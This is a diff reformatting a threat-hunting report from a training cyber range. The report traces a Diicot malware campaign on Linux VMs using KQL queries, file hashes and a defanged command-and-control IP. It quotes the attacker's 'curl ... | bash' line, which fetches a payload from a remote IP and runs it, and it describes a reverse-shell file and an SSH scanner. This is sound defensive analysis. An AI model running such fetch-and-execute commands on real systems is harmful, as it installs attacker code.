@@ -105,9 +105,9 @@ The `DeviceNetworkEvents` table was queried to determine whether the compromised
 
 <u>Script Actions</u>
 
-● `curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3`: attempts to fetch a file named black3 from the IP address `196[.]251[.]114[.]67`
-● `curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1`: if the first curl attempt is successful, the script pipes the contents of the black3 file directly to bash, which will execute the commands in the file
-● If the first server is unreachable, it tries to fetch the payload from the second IP address and again pipes it to bash to execute
+* `curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3`: attempts to fetch a file named black3 from the IP address `196[.]251[.]114[.]67`
+* `curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1`: if the first curl attempt is successful, the script pipes the contents of the black3 file directly to bash, which will execute the commands in the file
+* If the first server is unreachable, it tries to fetch the payload from the second IP address and again pipes it to bash to execute
 
 A quick inspection of the IP address `196[.]251[.]114[.]67` with VirusTotal reveals that the IP address is classified as malicious as well. Another search of the `DeviceNetworkEvents` table for successful connections with the new, malicious IP address returned no results. Suggesting that the threat actor was also unable to connect to the second IP address. At this stage of the investigation, sufficient artifacts and indicators had been collected and verified to conduct OSINT using available public information. Referencing the malicious files, IP addresses, and script code, a relevant threat report from **WIZ** was identified. The threat report focused on an active malware campaign being undergone by the threat group **Diicot** . The reported Diicot payload names, hashes, and indicators closely matched the activity observed within the CyberRange. Revealing several new indicators for further threat hunting.
 
@@ -168,111 +168,118 @@ DeviceFileEvents
 
 The query returned three more entries that shared the same file name, folder path, and hashes. The `Update` file was created in three other devices, all initiated by distinct file names and command lines. The following is information of each respective log in chronological order,
 
-Device Name: linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-Time: 2025-03-04T17:52:53.939295Z
-Initiating Process Account Domain: linux-program-fix
-Initiating Process Account Name: root
-Initiating Process File Name: mnflegnm
-Initiating Process Command Line: ./MNFleGNm
-Device Name: linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-Time: 2025-03-07T21:25:14.297296Z
-Initiating Process Account Domain: linux-programatic-ajs
-Initiating Process Account Name: root
-Initiating Process File Name: aqseumky
-Initiating Process Command Line: ./AqsEUmKy
-Device Name: linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-Time: 2025-03-13T05:45:43.568608Z
-Initiating Process Account Domain: linuxvmdavid
-Initiating Process Account Name: root
-Initiating Process File Name: ogbeupss
-Initiating Process Command Line: ./oGBeupSS
-Device Name: sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-Time: 2025-03-14T17:47:55.121801Z
-Initiating Process Account Domain: sakel-lunix-2
-Initiating Process Account Name: root
-Initiating Process File Name: upzbubnv
-Initiating Process Command Line: ./UpzBUBnv
-To utilize reverse shells in their malware campaigns, Diicot typically uses another malicious file
-called “/var/tmp/cache”. Which functions as a reverse shell that gives the threat actor a direct
-remote connection to the compromised machine. Suspecting that the threat actor within the
-CyberRange could be employing a similar payload, the payload was searched within the
-CyberRange network.
+Device Name: `linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+Time: `2025-03-04T17:52:53.939295Z`
+Initiating Process Account Domain: `linux-program-fix`
+Initiating Process Account Name: `root`
+Initiating Process File Name: `mnflegnm`
+Initiating Process Command Line: `./MNFleGNm`
+
+Device Name: `linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+Time: `2025-03-07T21:25:14.297296Z`
+Initiating Process Account Domain: `linux-programatic-ajs`
+Initiating Process Account Name: `root`
+Initiating Process File Name: `aqseumky`
+Initiating Process Command Line: `./AqsEUmKy`
+
+Device Name: `linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+Time: `2025-03-13T05:45:43.568608Z`
+Initiating Process Account Domain: `linuxvmdavid`
+Initiating Process Account Name: `root`
+Initiating Process File Name: `ogbeupss`
+Initiating Process Command Line: `./oGBeupSS`
+
+Device Name: `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+Time: `2025-03-14T17:47:55.121801Z`
+Initiating Process Account Domain: `sakel-lunix-2`
+Initiating Process Account Name: `root`
+Initiating Process File Name: `upzbubnv`
+Initiating Process Command Line: `./UpzBUBnv`
+
+To utilize reverse shells in their malware campaigns, Diicot typically uses another malicious file called `/var/tmp/cache`. Which functions as a reverse shell that gives the threat actor a direct remote connection to the compromised machine. Suspecting that the threat actor within the CyberRange could be employing a similar payload, the payload was searched within the CyberRange network.
+
 Query
+
+```kql
 DeviceFileEvents
 | where Timestamp >= datetime(2024-11-01)
+// Filter for suspected, malicious "cache" files in documented file location
 | where FolderPath contains "tmp/cache"
 | order by Timestamp asc
-| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
-InitiatingProcessAccountDomain, InitiatingProcessAccountName
-The query returned four logs in total, indicating that four previous devices contained the
-malicious Update payload. The initiating domain name and account name remained the same
-for each respective device. In the latest log, the cache file was created by the same Update file
-found in all four machines. To verify if these files were malicious or not, the SHA256 hash was
-taken and cross referenced with VirusTotal. Searching the hash with the online database gave
-me a positive result for the first three files.
-Devices
-linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net,
-linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net,
-linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
+| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessAccountDomain, InitiatingProcessAccountName
+```
+
+The query returned four logs in total, indicating that four previous devices contained the malicious Update payload. The initiating domain name and account name remained the same for each respective device. In the latest log, the cache file was created by the same Update file found in all four machines. To verify if these files were malicious or not, the SHA256 hash was taken and cross referenced with VirusTotal. Searching the hash with the online database gave me a positive result for the first three files.
+
+Devices:
+
+`linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`,
+
+`linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`,
+
+`linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
 Had the malicious cache file with a SHA256 hash of,
-SHA256: 0e13e9e4443102bf5b26396b5319f528642b4f0477feb9c7f536fab379b73074
-However the latest cache file created on device,
-sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-had a distinct SHA256 hash from the previous iterations, suggesting that the threat actor was
-employing defense evasion techniques to remain undetected in the network. The SHA256 hash
-being discussed has a value of,
-SHA256: 8c2a00409bad8033fec13fc6ffe4aa4732d80400072043b71ceb57db37244129
-Using VirusTotal again to confirm if the suspected file was malicious or not, resulted in another
-positive result.
-Another note to add for the first three created cache files, all three were created with an
-initiating process command line of,
-scp -qt /tmp/cache
+
+SHA256: `0e13e9e4443102bf5b26396b5319f528642b4f0477feb9c7f536fab379b73074`
+
+However the latest cache file created on device, `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net` had a distinct SHA256 hash from the previous iterations, suggesting that the threat actor was employing defense evasion techniques to remain undetected in the network. The SHA256 hash being discussed has a value of,
+
+SHA256: `8c2a00409bad8033fec13fc6ffe4aa4732d80400072043b71ceb57db37244129`
+
+Using VirusTotal again to confirm if the suspected file was malicious or not, resulted in another positive result. Another note to add for the first three created cache files, all three were created with an initiating process command line of,
+
+`scp -qt /tmp/cache`
+
 Script
-scp (Secure Copy Protocol) – Used to securely transfer files between systems over SSH
--q (Quiet Mode) – Suppresses non-error messages to avoid detection
--t (Target Mode) – Indicates that this scp command is running in receive mode, meaning it is
-expecting a file to be sent to /tmp/cache
-Another indicator suggesting that the cache files were malicious is that the initiating command
-executed in silent mode and was actively listening for commands. Understanding the purpose of
-these files as reverse shells, network connections established by these files were searched for.
-With the following query,
+
+`scp` (Secure Copy Protocol) – Used to securely transfer files between systems over SSH
+`-q` (Quiet Mode) – Suppresses non-error messages to avoid detection
+`-t` (Target Mode) – Indicates that this scp command is running in receive mode, meaning it is expecting a file to be sent to `/tmp/cache`
+
+Another indicator suggesting that the cache files were malicious is that the initiating command executed in silent mode and was actively listening for commands. Understanding the purpose of these files as reverse shells, network connections established by these files were searched for. With the following query,
+
 Query
+
+```kql
 DeviceNetworkEvents
 | where Timestamp >= datetime(2024-11-01)
 | where InitiatingProcessFileName contains "cache"
-A total of 23 connection requests were observed to the remote IP address 87[.]120[.]114[.]219,
-which has been identified as one of Diicot’s command-and-control (C2) servers. VirusTotal was
-used to verify that the IP address is affiliated with the Diicot malware group.
-Another malicious file associated with the same Diicot malware campaign, often found
-alongside the malicious "Update" and "cache" files, is ".bisis". The bisis payload has a
-documented folder path of “/var/tmp/.update-logs/.bisis“. Thos malicious file is designed to be
-a scanner for banner grabbing and identifying systems running OpenSSH. It downloads an IP
-list from hardcoded URLs, scans port 22 on remote machines for SSH banners and inspects the
-received responses to discover machines with OpenSSH. Threat actors typically exploit weak
-SSH credentials to gain an initial access vector into an environment. Using a similar query to the
-previous one, I inspected all systems in the network starting from November 1, 2024.
+```
+
+A total of 23 connection requests were observed to the remote IP address `87[.]120[.]114[.]219`, which has been identified as one of Diicot’s command-and-control (C2) servers. VirusTotal was used to verify that the IP address is affiliated with the Diicot malware group. Another malicious file associated with the same Diicot malware campaign, often found alongside the malicious `Update` and `cache` files, is `.bisis`. The `.bisis` payload has a documented folder path of `/var/tmp/.update-logs/.bisis`. Thos malicious file is designed to be a scanner for banner grabbing and identifying systems running OpenSSH. It downloads an IP list from hardcoded URLs, scans port 22 on remote machines for SSH banners and inspects the received responses to discover machines with OpenSSH. Threat actors typically exploit weak SSH credentials to gain an initial access vector into an environment. Using a similar query to the previous one, I inspected all systems in the network starting from November 1, 2024.
+
 Query
+
+```kql
 DeviceFileEvents
 | where Timestamp >= datetime(2024-11-01)
+// Filtering for the "bisis" payload
 | where FolderPath == "/var/tmp/.update-logs/.bisis"
-| project Timestamp, DeviceName, ActionType, FolderPath, InitiatingProcessAccountDomain,
-InitiatingProcessAccountName
+| project Timestamp, DeviceName, ActionType, FolderPath, InitiatingProcessAccountDomain, InitiatingProcessAccountName
 | order by Timestamp asc
-The query returned four logs identifying devices that contained the malicious Update payload,
-also held the bisis file.
-1. linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-2. linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-3. linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-4. sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-After identifying the affected systems containing the malicious .bisis payload, the file's SHA256
-hash was cross-referenced with VirusTotal, confirming that the discovered file was indeed
-malicious. The hashes:
-MD5: 5e12f81d5f949dbbd24ab82990a4bc5b
-SHA1: 7f65f650fb8bbc48e803af72b236ebd2f03095a6
-SHA256: 2828ca39e2a5b0fd3b0968bc75b67b4c587a49c13929a6cb050b0989ee01cd22
-VirusTotal identifies the discovered .bisis file as belonging to the "portscan" family, aligning with
-Diicot’s use of the .bisis file as a port scanner.
-Other Indicators of Compromise
+```
+
+The query returned four logs identifying devices that contained the malicious `Update` payload, also held the `.bisis` file.
+
+1. `linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+2. `linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+3. `linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+4. `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+After identifying the affected systems containing the malicious `.bisis` payload, the file's SHA256 hash was cross-referenced with VirusTotal, confirming that the discovered file was indeed malicious. The hashes:
+
+MD5: `5e12f81d5f949dbbd24ab82990a4bc5b`
+SHA1: `7f65f650fb8bbc48e803af72b236ebd2f03095a6`
+SHA256: `2828ca39e2a5b0fd3b0968bc75b67b4c587a49c13929a6cb050b0989ee01cd22`
+
+VirusTotal identifies the discovered `.bisis` file as belonging to the "portscan" family, aligning with Diicot’s use of the `.bisis` payload as a port scanner.
+
+## Other Indicators of Compromise
+
 Inspecting network activity on device
 “sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net”
 numerous abnormal activities were logged. Inspecting the DeviceNetworkEvents table
